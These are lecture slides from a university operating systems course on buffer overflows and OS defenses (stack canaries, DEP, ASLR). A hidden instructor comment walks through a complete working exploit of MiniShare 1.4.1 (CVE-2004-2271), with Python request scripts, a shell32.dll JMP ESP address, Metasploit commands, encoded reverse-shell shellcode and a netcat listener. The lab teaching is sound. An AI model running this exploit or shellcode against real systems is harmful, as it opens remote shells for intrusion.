% Lecture 40 - Software Security Defenses
% CprE 308
% April 17, 2015

# Software Security Defenses

## Topics

This lecture:

 - Review Buffer Overflow Concepts
 - Buffer Overflow (Practical Example)
    - Reversing and remotely exploiting a Windows web server
 - Operating system defenses
     - Stack canaries, DEP, ASLR
 - Quiz
 - Feedback Forms

# Review

## The Vulnerable Source Code
Why is this vulnerable?

```c
#include <stdio.h>
int main(int argc, char **argv) {
  char buf[64];
  strcpy(buf, argv[1]);
}
```

## Why is this Vulnerable?
 - Program is soliciting input from the user through the program arguments
 - Input is stored to memory (buf)
 - Input bounds are not checked and data in
memory can be overwritten
 - The main function has a return address that can be overwritten to point to data in the buffer

## Exploit
Exploit = [Payload] + JMP logic]

Payload = [NOP Sled + Shellcode]

 - Payload is the length of the buffer
     - sizeof(NOP Sled) = sizeof(buffer) minus sizeof(shellcode)
     - CPU executes NOP’s until it hits shellcode
 - JMP logic is what extends past the bounds of the buffer and overwrites the stack pointer (to point back into the buffer containing shellcode)
     - May be able to overwrite/control other registers besides the stack pointer to take control
 
## Exploit Privilege
 - Shellcode runs at the permission level of the user that ran the program
     - What if the vulnerable code was in the Kernel?

## Exploit Privilege
![Privilige Rings](./img/priv_rings.png)

## Exploit Privilege
 - Could there be a Ring -1?
    - Bios, hardware, virtual machine host

## Typical Payloads (Post Exploitation)
 - Stager code that downloads and runs more malicious code
    - Usually needed if the buffer is too small to hold all the exploit code
 - Add a user account
 - Patch vulnerability + install a protected backdoor
 - Keylogger, network monitor, etc.

## Secure Coding
Practice defensive coding and check your inputs!

```c
#include <stdio.h>
int main(int argc, char **argv)
{
    char buf[64];
    // LEN - 1 so that we don’t write a null byte past
    // the bounds of buf if n = sizeof(buf)
    strncpy(buf, argv[1], 64-1);
}
```

## Secure Coding (Alternative Functions)
Source: [http://developer.apple.com](http://developer.apple.com/library/mac/#documentation/Security/Conceptual/SecureCodingGuide/Articles/BufferOverflows.html)

![Alternate Functions Table](./img/functions_table.png)

## OS Defense: Stack Canaries
A canary is a tripwire placed before the return pointer that when overwritten by a buffer overflow changes the value of the canary and signals to the OS that the program state has been compromised.

- Terminator canaries - Canaries with randomly selected values placed at the ends of strings or buffers
- Random canaries - Randomly placed canaries that are hard to predict to an attacker, usually implemented as an XOR of the original control data

# Practical Example

## Important Resources

 - [Link: Iowa State University Software Center](https://it.engineering.iastate.edu/downloads/)
     - Windows Operating System ISO images
     - VMWare Workstation or VMWare Fusion (Mac)
 - [Link: Kali Linux](https://www.kali.org/)
     - [VMWare Images](https://www.offensive-security.com/kali-linux-vmware-arm-image-download/)
 - [Link: Online walkthrough of attack](http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html)

## Network Setup

Victim

 - Windows XP Professional Service Pack 3
     - MiniShare 1.4.1
     - OllyDbg 1.10
     
Attacker

 - Kali Linux
     - Python
     - Metasploit
     - Netcat 
     
## Common Vulnerabilities and Exposures

 - What is a CVE?
     - Common Vulnerabilities and Exposures (CVE)
     - Assigns an identifier to the description of the problem
 - Giant databases of known vulnerabilities (and exploits)
     - [http://cve.mitre.org/](http://cve.mitre.org/)
     - [http://nvd.nist.gov/](http://nvd.nist.gov/)
     - [http://www.rapid7.com/db/](http://www.rapid7.com/db/)

## MiniShare 1.4.1 CVE-2004-2271

The vulnerability is caused due to a boundary error in the handling of HTTP "GET" requests. This can be exploited to cause a buffer overflow by sending a specially crafted overly long request with a pathname larger than 1787 bytes.

Successful exploitation can lead to execution of arbitrary code.

[Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2271)

## Demo
Demo building exploit for MiniShare 1.4.1

Note: See the markdown source of this presentation for an extended discussion in the comments.

<!--
Note to instructors: The students should really be able to see the registers and commands on the victim and attacker machine for this demo.  Take some time to setup Ollydbg font size (Options -> Appearance -> Fonts -> Change) as well as changing the appearance of the Kali command line terminal background color and font size so its viewable on a projector setup.

Step 1) 
Get IP address of victim (ipconfig) and attacker machine (ifconfig)
Say victim IP is 172.16.69.204 and attacker IP is 172.16.69.208

Step 2) 
CVE says problem occurs with GET requests longer than 1787, so reproduce the problem by send a GET request with 2000 A's (0x41) and then inspect crash in Ollydbg.

```
#!/usr/bin/python
import socket

target_address="172.16.69.204"
target_port=80

buffer = "GET " + ("\x41" * 2000) + " HTTP/1.1\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
```

Observe in Ollydbg that the EIP register is now 0x41414141 and that the ESP register address is pointing at an address inside the buffer.  The EIP register holds the address in memory of the next instruction to be run by the CPU.  The ESP register is the stack pointer.

If the value of the EIP register is 0xFFE4 (a JMP ESP instruction), then the program execution will jump to the value of the ESP register.

Our goal is to execute our own code.  We can fit some very small code into our buffer that we control, but we need to get the program to execute that code somehow.

When we overwrite the EIP register value, we should overwrite it with the address of a "JMP ESP" instruction.  At the time of the crash the ESP register is already set to an address within the 2000 A's we filled up in memory, so executing a JMP ESP will make the program jump to that position in memory and execute the code we filled it with.

The problem is that each time our program loads, it is loaded into a different section of memory.  So how can we find an address of a JMP ESP instruction?

Windows DLLs are libraries of code shared between multiple programs.  Since all programs must know where in memory to access the DLL library functions, we that a JMP ESP instruction address inside a DLL must remain constant.

Step 3) 
Let's find an address of a JMP ESP instruction in a loaded DLL.  For bonus points, find the instruction in a DLL that is guaranteed to be loaded by the program and is less likely to be updated in the near future such as shell32.dll or user32.dll.

Note that we cannot use any memory address that contains a 0x00 (null terminator), 0x0A (line feed), or 0x0D (carriage return) because it is treated as an end of line in a string copy.  For various operating systems, a few other bytes are not allowed because they hold special meanings.

Using OllyDBG we find a good candidate in shell32.dll at memory address 0x7C9D30D7.  Note that for different versions of Windows, including service and language packs these memory addresses will change.

Step 4)
Next find the offset in the buffer of exactly where ESP is pointing at during the crash.

/usr/share/metasploit-framework/tools/pattern_create.rb 2000

```
#!/usr/bin/python
import socket

target_address="172.16.69.204"
target_port=80

buffer = "GET "
buffer += ("\x90" * 1787) # NOP Filler
buffer += "\x41\x41\x41\x41" # EIP address
buffer += ("\xCC" * (2000 - len(buffer))) # ESP points here
buffer += " HTTP/1.1\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
```
Now note the value of the ESP register is Ch7C.

/usr/share/metasploit-framework/tools/pattern_offset.rb Ch7C

We learn that the stack pointer is at a offset of 1791 bytes in the buffer.
                 
Now that we know ESP is point at an offset of 1791 bytes into the buffer, let's find what offset the EIP register is overwritten at.  Note the address of the EIP register is 0x36684335.

/usr/share/metasploit-framework/tools/pattern_offset.rb 36684335

We find the offset where EIP is overwritten is at 1787 bytes into the buffer.  This tool rounds to 16 bit (2 byte) offsets.

We can now draw a picture of what we need to send to the buffer to build out our exploit code.

buffer[0]          EIP          ESP
| <- NOP Filler -> | 0x41414141 |  <- 0xCC Shellcode -> |
0                  1787         1791

Step 5)
Using what we learned, create a request to overwrite the EIP register to the memory address 0x7C9D30D7.  Note that the x86 architecture is little endian so we have to load the bytes in backwards (0xD7309D7C).  We can fill the rest of request buffer with 0xCC (to indicate code) as a placeholder for our shellcode.

```
#!/usr/bin/python
import socket

target_address="172.16.69.204"
target_port=80

buffer = "GET "
buffer += ("\x90" * 1787) # NOP Filler
buffer += "\x41\x41\x41\x41" # EIP address
buffer += ("\xCC" * (2000 - len(buffer))) # ESP points here
buffer += " HTTP/1.1\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
```

Step 6)
Now let's generate a payload to make a reverse TCP shell connection from the victim to the attacker's machine.  Remember that we cannot use any invalid characters in our shellcode.

Metasploit gives a handy tool to generate some typical payloads (including the reverse shell) for various machine architectures and a way to encode it without using invalid characters.

msfpayload windows/shell_reverse_tcp LHOST=172.16.189.131 LPORT=443 R | msfencode -a x86 -b '\x00\x0a\x0d' -t c

LHOST=172.16.189.131 sets the IP address this shellcode should try to connect to (IP should be the attacker machine)

LPORT=443 sets the port the connection should be made on.  Just for kicks we use port 443, which is SSL/HTTPS.

R outputs the raw shellcode

-a x86 specifies the shellcode is targeted at the x86 architecture

-t c outputs the shellcode in a C style format

-b '\x00\x0a\x0d' specifies characters to avoid in the final shellcode

Note that our request is now greater than 2000 bytes.  In our case we get lucky our request is less than 2200 bytes, which for this vulnerability is the most we can overflow into memory before breaking things too much.  Otherwise our payload would need to be smaller, potentially using some sort of stager to accomplish our grand evil plan.

```
#!/usr/bin/python
import socket

target_address="172.16.69.204"
target_port=80

buffer = "GET "
buffer += ("\x90" * 1787) # NOP Filler
buffer += "\xD7\x30\x9D\x7C" # EIP address (little endian)

buffer+= ("\x90" * 16) # some NOPs for stability of encoded shellcode

# ESP points here at 1791 byte offset, ready to drop our payload
# msfpayload windows/shell_reverse_tcp LHOST=172.16.69.208 LPORT=443 R | msfencode -a x86 -b '\x00\x0a\x0d' -t c
# x86/shikata_ga_nai 341 bytes
# Setup listen server with: 
# nc -nvvlp 443
buffer+= ("\xdb\xdb\xb8\x64\x04\xc8\x9a\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
          "\x4f\x83\xc3\x04\x31\x43\x15\x03\x43\x15\x86\xf1\x34\x72\xcf"
          "\xfa\xc4\x83\xaf\x73\x21\xb2\xfd\xe0\x21\xe7\x31\x62\x67\x04"
          "\xba\x26\x9c\x9f\xce\xee\x93\x28\x64\xc9\x9a\xa9\x49\xd5\x71"
          "\x69\xc8\xa9\x8b\xbe\x2a\x93\x43\xb3\x2b\xd4\xbe\x3c\x79\x8d"
          "\xb5\xef\x6d\xba\x88\x33\x8c\x6c\x87\x0c\xf6\x09\x58\xf8\x4c"
          "\x13\x89\x51\xdb\x5b\x31\xd9\x83\x7b\x40\x0e\xd0\x40\x0b\x3b"
          "\x22\x32\x8a\xed\x7b\xbb\xbc\xd1\xd7\x82\x70\xdc\x26\xc2\xb7"
          "\x3f\x5d\x38\xc4\xc2\x65\xfb\xb6\x18\xe0\x1e\x10\xea\x52\xfb"
          "\xa0\x3f\x04\x88\xaf\xf4\x43\xd6\xb3\x0b\x80\x6c\xcf\x80\x27"
          "\xa3\x59\xd2\x03\x67\x01\x80\x2a\x3e\xef\x67\x53\x20\x57\xd7"
          "\xf1\x2a\x7a\x0c\x83\x70\x13\xe1\xb9\x8a\xe3\x6d\xca\xf9\xd1"
          "\x32\x60\x96\x59\xba\xae\x61\x9d\x91\x16\xfd\x60\x1a\x66\xd7"
          "\xa6\x4e\x36\x4f\x0e\xef\xdd\x8f\xaf\x3a\x71\xc0\x1f\x95\x31"
          "\xb0\xdf\x45\xd9\xda\xef\xba\xf9\xe4\x25\xcd\x3e\x72\x6a\xde"
          "\x85\x53\x1a\xdd\x05\x55\x60\x68\xe3\x3f\x86\x3d\xbc\xd7\x3f"
          "\x64\x36\x49\xbf\xb2\xde\xea\x52\x59\x1e\x64\x4f\xf6\x49\x21"
          "\xa1\x0f\x1f\xdf\x98\xb9\x3d\x22\x7c\x81\x85\xf9\xbd\x0c\x04"
          "\x8f\xfa\x2a\x16\x49\x02\x77\x42\x05\x55\x21\x3c\xe3\x0f\x83"
          "\x96\xbd\xfc\x4d\x7e\x3b\xcf\x4d\xf8\x44\x1a\x38\xe4\xf5\xf3"
          "\x7d\x1b\x39\x94\x89\x64\x27\x04\x75\xbf\xe3\x34\x3c\x9d\x42"
          "\xdd\x99\x74\xd7\x80\x19\xa3\x14\xbd\x99\x41\xe5\x3a\x81\x20"
          "\xe0\x07\x05\xd9\x98\x18\xe0\xdd\x0f\x18\x21")

buffer += " HTTP/1.1\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
```

Let's kick off our exploit.  First open a port on the attacker machine for the victim to connect back to.  Run `nc -nvvlp 443`.  Now run the exploit code and see that the reverse shell connects back to the attacker with a shell prompt!
-->

## Reproduce Error
![Reproduce Error](./img/exploit1.png)

## Find a JMP ESP Instruction
![Find a JMP ESP Instruction](./img/exploit2.png)

## Calculate Overwrite Offsets
![Calculate Overwrite Offsets](./img/exploit3.png)

## Test Offsets
![Test Offsets](./img/exploit4.png)

## Jump to Shellcode
![Jump to Shellcode](./img/exploit5.png)

## Execute Reverse TCP Shell
![Execute Reverse TCP Shell](./img/exploit6.png)

## Silent Attack 
![Silent Attack](./img/exploit7.png)

## Exploit

- len(buffer) < 1787
- NOP filler could be any valid bytes here (just not 0x00, 0x0A, 0x0D), since the filler is not going to be executed
- A small NOP sled is added before the shellcode to give our exploit some stability
- Futher experimentation reveals we only have 2220 bytes to play with, leaving only 429 bytes for the payload

```
buffer[0]        EIP       ESP
| <-NOP Filler-> | JMP ESP | [(NOP * 16) Shellcode]-> |
0                1787      1791                    2220
```

## Metasploit Modules

 - Create modularized exploit code for automatic exploitation of known vulnerabilities
     - [http://www.rapid7.com/db/modules/exploit/windows/http/minishare_get_overflow](http://www.rapid7.com/db/modules/exploit/windows/http/minishare_get_overflow)
     - [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/minishare_get_overflow.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/minishare_get_overflow.rb)
     
Writing exploits requires some skill.  Running exploits requires very little knowledge (script kiddies).

# OS Defenses

## OS Defense: Stack Canaries
A canary is a tripwire place before the return pointer that when overwritten by a buffer overflow changes the value of the canary and signals to the OS that the program state has been compromised.

- Terminator canaries - Canaries with randomly selected values placed at the ends of strings or buffers
- Random canaries - Randomly placed canaries that are hard for an attacker to predict, usually implemented as an XOR of the original control data

## OS Defense: Data Execution Prevention (DEP)

Uses segementation to mark areas of memory as either executable or non-executable.  Executing memory marked as non-executable causes a segmentation fault.

- Prevents an attacker from executing code in an area of memory that was intended soley for data
    - Idea: If we know its data, don't treat it like code!
- Attackers can combat this technique by using what already exists in memory
    - Return-to-libc just sets up parameters and then sets the return pointer to a function in the standard C library (i.e. calls a C function)

## OS Defense: Address Space Layout Randomization (ASLR)

Randomly rearranges the address locations in memory of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.

- Prevents an attacker from reliably jumping to a position in memory
    - Idea: It doesn't matter if you can control the instruction pointer if you don't know where to jump to!  
- Attackers combat this technique by trying to reduce entropy
     - Heap spraying loads several copies of the attack into memory to increase success rates, by hoping the jump hits an exploit
     - Leaky/danging pointers (pointers that don't point where they are suppose to be pointing)

# Quiz

## Questions
Any questions before the quiz?